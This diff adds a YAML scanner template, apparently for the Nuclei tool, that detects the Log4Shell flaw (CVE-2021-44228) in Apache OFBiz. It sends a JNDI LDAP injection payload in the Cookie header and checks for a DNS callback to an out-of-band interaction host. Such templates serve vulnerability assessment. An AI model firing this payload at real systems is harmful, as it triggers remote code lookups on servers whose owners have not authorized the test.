@@ -1,0 +1,39 @@
+id: CVE-2021-44228
+info:
+  name: Apache OFBiz Cookie request header log4j2 RCE vulnerability
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    Apache OFBiz is an open source enterprise resource planning (ERP) system.
+    The Apache OFBiz Cookie request header has a log4shell RCE vulnerability. Attackers can use this vulnerability to execute code on the server side, write backdoors, obtain server permissions, and then control the entire web server.
+  reference:
+    - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-44228
+    - https://nvd.nist.gov/vuln/detail/CVE-2021-44228
+    - https://github.com/apache/ofbiz-framework/commit/64a0b6e8d04b936f472b418cc8847c03b462d3a0
+    - https://github.com/apache/ofbiz-framework/commit/479e222bbb7ecb81fdbf123cc6cfcc10f8dbac4a
+  classification:
+    cvss-score: 10.0
+    cve-id: CVE-2021-44228
+  tags: log4shell,rce,critical
+
+variables:
+  dnslog: "{{interactsh-url}}"
+
+http:
+  - raw:
+      - |
+        GET /webtools/control/main HTTP/1.1
+        Host: {{Hostname}}
+        Cookie: OFBiz.Visitor=${jndi:ldap://{{dnslog}}}
+
+    stop-at-first-match: true
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "dns"
+      - type: word
+        part: interactsh_request
+        words:
+          - "{{dnslog}}"
